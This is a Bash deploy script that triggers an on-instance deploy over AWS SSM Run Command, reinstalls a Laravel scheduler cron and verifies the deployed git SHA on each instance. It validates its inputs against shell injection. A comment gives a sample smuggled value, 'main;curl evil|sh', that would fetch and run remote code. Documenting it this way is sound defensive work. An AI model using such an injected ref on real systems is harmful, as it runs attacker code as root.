#!/usr/bin/env bash
#
# scripts/deploy/trigger.sh
#
# Triggers the on-instance deploy script (baked into the instance image,
# not owned by this repo) via AWS SSM Run Command.
#
# Usage:
#   scripts/deploy/trigger.sh <git-ref> [<expected-sha>]
#   DEPLOY_REF=<git-ref> scripts/deploy/trigger.sh
#
# When <expected-sha> (or DEPLOY_EXPECTED_SHA) is given, a follow-up SSM
# command runs `git rev-parse HEAD` on every targeted instance once the
# deploy succeeds, and each instance's output is compared against it: a
# concrete assertion that the ref actually deployed, without touching the
# public HTTP surface.
#
# Config (env; the four marked REQUIRED have no defaults on purpose, so a
# fresh project cannot deploy to somebody else's fleet by accident):
#   AWS_REGION              AWS region for every SSM/EC2 call (default: eu-west-1)
#   DEPLOY_TAG_KEY          REQUIRED. EC2 tag key used to resolve deploy targets
#   DEPLOY_TAG_VALUE        REQUIRED. EC2 tag value used to resolve deploy targets
#   DEPLOY_COMMAND          REQUIRED. Absolute path of the deploy script on the
#                           instance; called as `<DEPLOY_COMMAND> <ref>`
#   DEPLOY_CHECKOUT_PATH    REQUIRED when an expected SHA is given. The git
#                           checkout on the instance, for the HEAD check
#   DEPLOY_APP_PATH         Laravel app directory on the instance. When set, the
#                           scheduler cron is reasserted after each deploy
#   DEPLOY_PHP_BIN          PHP binary the scheduler cron uses (default: php)
#   DEPLOY_CRON_USER        User the scheduler cron runs as (default: nginx)
#   DEPLOY_CRON_NAME        File name under /etc/cron.d (default: laravel-scheduler)
#   DEPLOY_TIMEOUT          Seconds to wait for every SSM invocation to reach a
#                           terminal state before giving up (default: 600)
#   DEPLOY_POLL_INTERVAL    Seconds between poll attempts (default: 5)
#
# Instance targeting note: SSM SendCommand is account/region-scoped, NOT
# tag-conditioned (ssm:ResourceTag isn't evaluated in the SSM auth
# context), so this script resolves running instance IDs via
# `aws ec2 describe-instances` first, then passes them explicitly via
# `--instance-ids` to `send-command`. No ASG lookups are performed.
#
# Exit non-zero if zero instances are found, if any instance's invocation
# fails/times out, or if the overall timeout is reached before every
# instance reaches a terminal state.

set -euo pipefail

REF="${1:-${DEPLOY_REF:-}}"
if [[ -z "${REF}" ]]; then
  echo "error: no git ref given (pass as \$1 or set DEPLOY_REF)" >&2
  exit 1
fi

# REF is operator-typed (workflow_dispatch input) and gets interpolated,
# unescaped, into a JSON `commands=[...]` payload that SSM Run Command
# executes as root on the target instance(s) below. Validate it BEFORE
# any use: allow only characters that ever appear in a real git ref (full
# SHAs, branch names, tags): letters, digits,
# '.', '_', '/', '-', never a leading '-' (could be misread as a flag).
# This blocks both shell injection (e.g. "main;curl evil|sh") and JSON
# breakage (a ref containing '"').
if [[ ! "${REF}" =~ ^[A-Za-z0-9][A-Za-z0-9._/-]*$ ]]; then
  echo "error: invalid git ref '${REF}': refs may contain only letters, digits, '.', '_', '/', '-' and must not start with '-'" >&2
  exit 1
fi

EXPECTED_SHA="${2:-${DEPLOY_EXPECTED_SHA:-}}"
if [[ -n "${EXPECTED_SHA}" && ! "${EXPECTED_SHA}" =~ ^[A-Za-z0-9][A-Za-z0-9._/-]*$ ]]; then
  echo "error: invalid expected sha '${EXPECTED_SHA}'" >&2
  exit 1
fi

REGION="${AWS_REGION:-eu-west-1}"
TAG_KEY="${DEPLOY_TAG_KEY:?DEPLOY_TAG_KEY is required}"
TAG_VALUE="${DEPLOY_TAG_VALUE:?DEPLOY_TAG_VALUE is required}"
DEPLOY_SCRIPT="${DEPLOY_COMMAND:?DEPLOY_COMMAND is required}"
CHECKOUT_PATH="${DEPLOY_CHECKOUT_PATH:-}"
APP_PATH="${DEPLOY_APP_PATH:-}"
PHP_BIN="${DEPLOY_PHP_BIN:-php}"
CRON_USER="${DEPLOY_CRON_USER:-nginx}"
CRON_NAME="${DEPLOY_CRON_NAME:-laravel-scheduler}"
TIMEOUT="${DEPLOY_TIMEOUT:-600}"
POLL_INTERVAL="${DEPLOY_POLL_INTERVAL:-5}"

if [[ -n "${EXPECTED_SHA}" && -z "${CHECKOUT_PATH}" ]]; then
  echo "error: DEPLOY_CHECKOUT_PATH is required when an expected sha is given" >&2
  exit 1
fi

# Every value below is interpolated into a root shell command on the
# instance, so hold each to a conservative path/word character set.
for v in "${DEPLOY_SCRIPT}" "${CHECKOUT_PATH}" "${APP_PATH}" "${PHP_BIN}" "${CRON_USER}" "${CRON_NAME}"; do
  if [[ -n "${v}" && ! "${v}" =~ ^[A-Za-z0-9._/-]+$ ]]; then
    echo "error: deploy config value '${v}' contains characters outside [A-Za-z0-9._/-]" >&2
    exit 1
  fi
done

echo "==> Resolving running instances tagged ${TAG_KEY}=${TAG_VALUE} in ${REGION}"

instance_ids_raw="$(
  aws ec2 describe-instances \
    --region "${REGION}" \
    --filters "Name=tag:${TAG_KEY},Values=${TAG_VALUE}" "Name=instance-state-name,Values=running" \
    --query 'Reservations[].Instances[].InstanceId' \
    --output text
)"

# shellcheck disable=SC2206 # word-splitting on the AWS CLI's whitespace-separated text output is intentional
instance_ids=(${instance_ids_raw})

if [[ ${#instance_ids[@]} -eq 0 ]]; then
  echo "error: no running instances found tagged ${TAG_KEY}=${TAG_VALUE} in ${REGION}" >&2
  exit 1
fi

echo "==> Targeting ${#instance_ids[@]} instance(s): ${instance_ids[*]}"
echo "==> Deploying ref '${REF}' via ${DEPLOY_SCRIPT}"

# Sends a single-command SSM Run Command document and polls every given
# instance to a terminal state, bounded by TIMEOUT/POLL_INTERVAL. Reused
# for both the deploy command and (when EXPECTED_SHA is set) the
# post-deploy ref-verification follow-up below.
#
# Deliberately avoids associative arrays for bash 3.2 compatibility
# (macOS default shell), should anyone need to exercise this locally.
#
# Populates the caller-visible globals:
#   POLL_SUCCEEDED  instance IDs that reported Success
#   POLL_FAILED     instance IDs that Failed/Cancelled/TimedOut, or were
#                    still pending when the overall TIMEOUT was reached
poll_ssm_command() {
  local poll_command_id="$1"
  shift
  local poll_pending=("$@")
  local poll_elapsed=0
  local instance_id status still_pending

  POLL_SUCCEEDED=()
  POLL_FAILED=()

  while [[ ${#poll_pending[@]} -gt 0 && ${poll_elapsed} -lt ${TIMEOUT} ]]; do
    sleep "${POLL_INTERVAL}"
    poll_elapsed=$((poll_elapsed + POLL_INTERVAL))

    still_pending=()
    for instance_id in "${poll_pending[@]}"; do
      # get-command-invocation can 400 with InvocationDoesNotExist for a
      # brief moment after send-command returns, before SSM has
      # propagated the command to the instance; treat that as "still
      # pending" rather than a hard failure; TIMEOUT still bounds this.
      status="$(
        aws ssm get-command-invocation \
          --region "${REGION}" \
          --command-id "${poll_command_id}" \
          --instance-id "${instance_id}" \
          --query 'Status' \
          --output text 2>/dev/null || echo "Pending"
      )"

      case "${status}" in
        Success)
          echo "==> [${instance_id}] Success"
          POLL_SUCCEEDED+=("${instance_id}")
          ;;
        Failed | Cancelled | TimedOut)
          echo "==> [${instance_id}] ${status}" >&2
          POLL_FAILED+=("${instance_id}")
          ;;
        *)
          still_pending+=("${instance_id}")
          ;;
      esac
    done
    # bash-3.2-safe empty-array expansion: a bare "${still_pending[@]}"
    # aborts under `set -u` on bash <4.4 when the array is empty (fires
    # exactly when every remaining instance just succeeded/failed in
    # this poll); the ${arr[@]+"${arr[@]}"} form sidesteps that.
    poll_pending=(${still_pending[@]+"${still_pending[@]}"})
  done

  if [[ ${#poll_pending[@]} -gt 0 ]]; then
    echo "error: timed out after ${TIMEOUT}s waiting on: ${poll_pending[*]}" >&2
    POLL_FAILED+=(${poll_pending[@]+"${poll_pending[@]}"})
  fi
}

command_id="$(
  aws ssm send-command \
    --region "${REGION}" \
    --document-name "AWS-RunShellScript" \
    --instance-ids "${instance_ids[@]}" \
    --parameters "commands=[\"${DEPLOY_SCRIPT} ${REF}\"]" \
    --query 'Command.CommandId' \
    --output text
)"

echo "==> SSM command ${command_id} dispatched"

poll_ssm_command "${command_id}" "${instance_ids[@]}"

if [[ ${#POLL_FAILED[@]} -gt 0 ]]; then
  echo "error: deploy failed on: ${POLL_FAILED[*]}" >&2
  exit 1
fi

echo "==> Deploy of ref '${REF}' succeeded on all targeted instances"

# Reassert the scheduler cron: queued work depends on schedule:run, and a
# hand-installed /etc/cron.d entry evaporates when an instance is recycled
# from the image. Until the cron file is baked into the image, every deploy
# heals it. It installs ONLY when the file is absent, so a hand-tuned entry
# on a live instance always wins. Skipped when DEPLOY_APP_PATH is unset.
if [[ -n "${APP_PATH}" ]]; then
  cron_line="* * * * * ${CRON_USER} cd ${APP_PATH} && ${PHP_BIN} artisan schedule:run >> /dev/null 2>&1"
  cron_file="/etc/cron.d/${CRON_NAME}"
  cron_command_id="$(
    aws ssm send-command \
      --region "${REGION}" \
      --document-name "AWS-RunShellScript" \
      --instance-ids "${instance_ids[@]}" \
      --parameters "commands=[\"test -f ${cron_file} || { printf '%s\\n' '${cron_line}' > ${cron_file} && chmod 644 ${cron_file} && echo installed; }\"]" \
      --query 'Command.CommandId' \
      --output text
  )"
  echo "==> Scheduler-cron reassertion ${cron_command_id} dispatched"
  poll_ssm_command "${cron_command_id}" "${instance_ids[@]}"
  if [[ ${#POLL_FAILED[@]} -gt 0 ]]; then
    echo "error: scheduler-cron reassertion failed on: ${POLL_FAILED[*]}" >&2
    exit 1
  fi
fi

if [[ -n "${EXPECTED_SHA}" ]]; then
  echo "==> Verifying deployed ref resolves to ${EXPECTED_SHA} on all targeted instances"

  # Run Command executes as root but the clone is usually owned by the web
  # user, so a bare `git` call dies with "detected dubious ownership"
  # (exit 128). The command carries its own per-invocation `-c` override.
  verify_command_id="$(
    aws ssm send-command \
      --region "${REGION}" \
      --document-name "AWS-RunShellScript" \
      --instance-ids "${instance_ids[@]}" \
      --parameters "commands=[\"git -c safe.directory=${CHECKOUT_PATH} -C ${CHECKOUT_PATH} rev-parse HEAD\"]" \
      --query 'Command.CommandId' \
      --output text
  )"

  echo "==> SSM command ${verify_command_id} dispatched"

  poll_ssm_command "${verify_command_id}" "${instance_ids[@]}"

  if [[ ${#POLL_FAILED[@]} -gt 0 ]]; then
    for instance_id in ${POLL_FAILED[@]+"${POLL_FAILED[@]}"}; do
      # Surface the on-instance stderr so the workflow log says WHY.
      aws ssm get-command-invocation \
        --region "${REGION}" \
        --command-id "${verify_command_id}" \
        --instance-id "${instance_id}" \
        --query 'StandardErrorContent' \
        --output text 2>/dev/null | sed "s/^/error: [${instance_id}] /" >&2 || true
    done
    echo "error: ref verification command failed on: ${POLL_FAILED[*]}" >&2
    exit 1
  fi

  mismatched_instances=()
  for instance_id in "${POLL_SUCCEEDED[@]}"; do
    actual_sha="$(
      aws ssm get-command-invocation \
        --region "${REGION}" \
        --command-id "${verify_command_id}" \
        --instance-id "${instance_id}" \
        --query 'StandardOutputContent' \
        --output text | tr -d '[:space:]'
    )"

    if [[ "${actual_sha}" != "${EXPECTED_SHA}" ]]; then
      echo "error: [${instance_id}] deployed HEAD '${actual_sha}' does not match expected '${EXPECTED_SHA}'" >&2
      mismatched_instances+=("${instance_id}")
    else
      echo "==> [${instance_id}] verified HEAD == ${EXPECTED_SHA}"
    fi
  done

  if [[ ${#mismatched_instances[@]} -gt 0 ]]; then
    echo "error: ref verification mismatch on: ${mismatched_instances[*]}" >&2
    exit 1
  fi

  echo "==> Ref verification succeeded on all targeted instances"
fi
